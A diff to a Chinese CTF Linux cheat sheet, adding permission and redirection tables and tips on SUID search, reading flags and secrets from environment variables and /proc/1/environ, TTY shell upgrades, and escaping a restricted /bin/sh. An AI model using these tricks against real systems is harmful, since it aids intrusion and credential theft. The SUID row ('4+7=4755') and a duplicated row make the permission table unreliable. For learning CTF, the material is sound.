 
-表示读取系统用户信息。
+| 权限 | 数字 |
+|:----:|:----:|
+| `r--` | 4 |
+| `rw-` | 6 |
+| `rwx` | 7 |
+| `r-x` | 5 |
+| `rws` | 4+7=4755（SUID） |
+| `r-x` | 5 |
 
-## 1.7 常见 Web 目录路径
+### 管道重定向速查
 
-Web 服务通常会把网站源码放在固定目录中。
+| 写法 | 含义 |
+|:----|:----|
+| `cmd1 \| cmd2` | 管道 |
+| `cmd > file` | 覆盖写入 |
+| `cmd >> file` | 追加写入 |
+| `cmd 2> file` | 错误写入 |
+| `cmd 2>&1` | 错误合并到输出 |
+| `cmd > /dev/null 2>&1` | 丢弃全部 |
 
-常见 Web 目录如下：
-
-| 路径                    | 说明                         |
-| ----------------------- | ---------------------------- |
-| `/var/www/html`         | Apache / PHP 常见网站目录    |
-| `/usr/share/nginx/html` | Nginx 常见网站目录           |
-| `/app`                  | Docker 题目中常见项目目录    |
-| `/www`                  | 一些环境中的网站目录         |
-| `/opt`                  | 常见应用安装目录             |
-| `/tmp`                  | 临时文件目录，常用于写入文件 |
-
-例如：
-
-```text
-/var/www/html/index.php
-```
-
-通常表示网站首页源码文件。
+>**新手避坑**：
+> - `2>/dev/null` 是把错误信息丢掉（比如"权限不够"），这样搜索结果更干净。不加的话屏幕会被大量 "Permission denied" 刷屏
+> - `line.strip()` 会删掉密码前后的空格，读字典时用 `line.rstrip("\r\n")`
+> - SUID 文件用 `find -perm -4000` 查找，不是 `find -perm 4000`（少了个 `-`）
+> - `cat /flag` 不行记得试试 `/readflag`，可能是 SUID 程序
+> - 在容器中 `systemctl` 通常不可用
+> - `python -c 'import pty; pty.spawn("/bin/bash")'` 可以升级 TTY shell
+> - `script -qc /dev/null /dev/null` 也是一条 TTY 升级命令
+> - 用 `curl -s` 或 `wget -qO-` 代替 `curl` 可以让 HTTP 请求不打印进度条
+> - 环境变量中搜 flag 别忘了 `echo $FLAG`、`printenv`、`declare -x`
+> - `cat /proc/1/environ` 可能暴露容器启动时的环境变量
+> - `ls -la /proc/*/exe` 可以查看所有进程的可执行文件路径
+> - 如果 `/bin/sh` 被限制，尝试 `python3 -c 'import os; os.system("/bin/bash")'` 或 `busybox sh`
